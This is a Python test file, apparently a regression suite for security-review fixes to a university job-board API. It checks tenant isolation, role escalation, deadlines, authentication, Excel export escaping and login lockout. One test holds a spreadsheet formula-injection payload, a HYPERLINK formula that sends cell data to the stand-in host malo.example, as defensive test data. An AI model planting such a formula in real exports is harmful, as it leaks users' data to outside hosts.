"""Correcciones de la revisión de seguridad: aislamiento entre universidades, roles, postulaciones,
preguntas de filtro, exportación a Excel y bloqueo de login."""

import uuid
from io import BytesIO

import pytest
from openpyxl import load_workbook

from app.common.exceptions import ForbiddenException
from app.security import login_rate_limiter
from app.shared.exportacion import Tabla, a_excel
from tests.test_requisitos_generales import UMSS, _usuario, client, datos, db_session  # noqa: F401 - fixtures


def test_el_admin_de_otra_universidad_no_gestiona_vacantes_ajenas(datos):
    # La empresa del fixture solo trabaja con la UAGRM.
    ruta = f"/api/vacantes/{datos['vigente_id']}"
    assert client.patch(f"{ruta}/estado", json={"status": "paused"}, headers=datos["admin_umss"]).status_code == 403
    assert client.delete(ruta, headers=datos["admin_umss"]).status_code == 403

    # El admin de la universidad vinculada sí puede.
    assert client.patch(f"{ruta}/estado", json={"status": "paused"}, headers=datos["admin"]).status_code == 200
    assert client.patch(f"{ruta}/estado", json={"status": "published"}, headers=datos["admin"]).status_code == 200


def test_el_admin_de_universidad_no_nombra_administradores(db_session, datos):
    def roles(quien):
        respuesta = client.get("/api/admin/roles", headers=datos[quien])
        assert respuesta.status_code == 200
        return {r["nombre"] for r in respuesta.json()}

    assert "platform_admin" not in roles("admin_umss")
    assert "platform_admin" in roles("superadmin")

    moderador = _usuario(db_session, "mod_umss", "moderator", UMSS)
    db_session.commit()
    respuesta = client.put(
        f"/api/admin/usuarios/{moderador.id}/rol", json={"rol": "platform_admin"}, headers=datos["admin_umss"]
    )
    assert respuesta.status_code == 403


def test_no_se_postula_despues_de_la_fecha_limite(datos):
    # La vacante «vencida» sigue publicada hasta que corre el cierre diario.
    respuesta = client.post(
        "/api/postulaciones/", json={"job_id": str(datos["vencida_id"]), "answers": []}, headers=datos["egresado"]
    )
    assert respuesta.status_code == 400
    assert "fecha límite" in respuesta.text


def test_las_preguntas_de_filtro_piden_sesion(datos):
    ruta = f"/api/vacantes/{datos['vigente_id']}/preguntas"
    assert client.get(ruta).status_code == 401
    assert client.get(ruta, headers=datos["egresado"]).status_code == 200


def test_el_excel_no_ejecuta_formulas_de_los_usuarios():
    tabla = Tabla(
        titulo="Egresados",
        encabezados=["Nombre", "Saldo"],
        filas=[['=HYPERLINK("https://malo.example/?d="&B2,"Ver")', -5], ["Ana", 3]],
    )
    hoja = load_workbook(BytesIO(a_excel(tabla))).active
    valores = [c.value for fila in hoja.iter_rows() for c in fila]
    assert '\'=HYPERLINK("https://malo.example/?d="&B2,"Ver")' in valores
    assert -5 in valores and "Ana" in valores  # los números negativos y el texto normal no cambian
    assert not any(isinstance(v, str) and v.startswith("=") for v in valores)


def test_el_bloqueo_de_login_no_se_evade_con_mayusculas():
    correo = f"Bloqueo_{uuid.uuid4().hex[:6]}@Test.bo"
    variantes = (correo, correo.lower(), correo.upper(), f"  {correo}  ", correo.swapcase())
    try:
        for variante in variantes:
            login_rate_limiter.registrar_intento_fallido(variante)
        with pytest.raises(ForbiddenException):
            login_rate_limiter.verificar_bloqueo(correo.lower())
    finally:
        login_rate_limiter.limpiar_intentos(correo)
    login_rate_limiter.verificar_bloqueo(correo)  # tras limpiar, vuelve a poder entrar
